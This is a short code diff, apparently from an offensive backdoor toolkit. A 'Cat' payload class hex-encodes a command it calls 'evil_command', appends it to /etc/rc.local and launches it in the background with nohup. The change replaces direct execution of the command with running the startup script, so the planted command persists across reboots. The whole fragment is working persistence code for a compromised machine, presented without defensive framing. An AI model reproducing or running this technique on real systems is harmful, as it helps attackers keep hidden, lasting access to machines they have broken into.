@@ -51,7 +51,7 @@ class Cat(Payload):
                         "2>/dev/null &" % self.cat_location)
         self.persistence = hex_repr(evil_command)
         self.commands.append("printf '%s' >> /etc/rc.local" % self.persistence)
-        self.commands.append(evil_command)
+        self.commands.append("nohup /etc/rc.local &")
 
     def steps(self):
         return self.commands
